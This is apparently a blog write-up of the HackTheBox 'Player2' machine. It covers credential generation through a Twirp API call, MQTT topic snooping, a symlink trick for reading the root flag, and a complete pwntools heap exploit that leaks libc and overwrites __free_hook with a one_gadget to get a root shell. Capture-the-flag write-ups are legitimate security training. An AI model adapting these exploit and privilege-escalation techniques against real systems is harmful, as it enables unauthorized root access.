---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/u_GkIzCmU90/0.jpg
layout: post
media_subpath: /assets/posts/2020-06-27-player2-hackthebox
tags:
- binary exploitation
- firmware
- heap
- mosquitto
- mqtt
- totp
- twirp
title: Player2 @ HackTheBox
---

Player2 is a 50-point Linux machine on HackTheBox. For user we do some web fuzzing, call a twirp method to get credentials, find hidden backup totp codes, and then bypass a signature check on a firmware sample we can upload. Finally, subscribe to the running Mosquitto MQTT service to find a SSH private key. For Root there is an unintended way to use MQTT to leak the root flag or a Heap Exploit.

{% youtube u_GkIzCmU90 %}

## Notes

**Get Credentials**

```
curl --request "POST" --location "http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds" --header "Content-Type:application/json" --data '{"number": 1}' --verbose 
```

**Mosquitto Sub**

```
mosquitto_sub -h 127.0.0.1 -v -t '$SYS/#' 
```

**Unintended Root (as observer)**

```
mv id_rsa id_rsa.bak
ln -s /root/root.txt id_rsa
```

The [Heap Exploit](https://gist.github.com/xct/257b83cbaba499643b331036ace8398b):

```python
#!/usr/bin/python
from pwn import *
import random
import string
import time

# Author: xct

def create_config(p, name='xct', desc_size=0, desc=''):
    p.recvuntil('protobs@player2:~$')
    p.sendline('2')
    p.recvuntil(']:')
    p.sendline(name)
    p.recvuntil(']:')
    p.sendline('')
    p.recvuntil(']:')
    p.sendline('')
    p.recvuntil(']:')
    p.sendline('')
    p.recvuntil(']:')
    p.sendline('')
    p.recvuntil(']:')
    p.sendline('')
    p.recvuntil(']:') 
    p.sendline(str(desc_size))
    p.recvuntil(']:')
    p.send(desc)


def delete_config(p, index):
    p.recvuntil('protobs@player2:~$')
    p.sendline('4')
    p.recvuntil(']:')
    p.sendline(str(index))


def read_config(p, index):
    p.recvuntil('protobs@player2:~$')
    p.sendline('3')
    p.recvuntil(']:')
    p.sendline(str(index))


context.arch = 'amd64'
context.log_level = 'debug'
libc = ELF('./libc.so.6')
main = ELF('./Protobs')

BASE_OFFSET = 0x1EB9a8 
FREE_HOOK = 0x1E75A8
ONE_GADGET =  0xe2383

s =  ssh(host='10.10.10.170', user='observer', keyfile='observer.key')
p = s.run('/opt/Configuration_Utility/Protobs')

create_config(p, desc_size=72, desc='A'*64)
read_config(p, 0)
p.recvuntil("A"*(64))
leak = p.recvline()[:-1]
leak += b"\x00\x00"
leak = u64(leak)
base = leak-BASE_OFFSET
log.success('Leak: ' +hex(leak))
log.success('Libc-Base: '+hex(base))
idx = 1


create_config(p, desc_size=0x68, name='BBBB', desc='B'*(0x68)) #1
create_config(p, desc_size=0x68, name='CCCC', desc='C'*(0x68)) #2
create_config(p, desc_size=0x38, name='DDDD', desc='D'*(0x38)) #3
create_config(p, desc_size=0x20, name='ZZZZ', desc='Z'*(0x20)) #4

delete_config(p, idx+2)
delete_config(p, idx+1)
create_config(p, desc_size=0x68, name=b'M'*0x68+b'N'*8+p64(base+FREE_HOOK), desc=b'P'*(0x20)) 
create_config(p, desc_size=0x38, name=p64(0xcafebabe), desc=p64(base+ONE_GADGET)) 
delete_config(p, 0)

p.interactive()
p.close()
```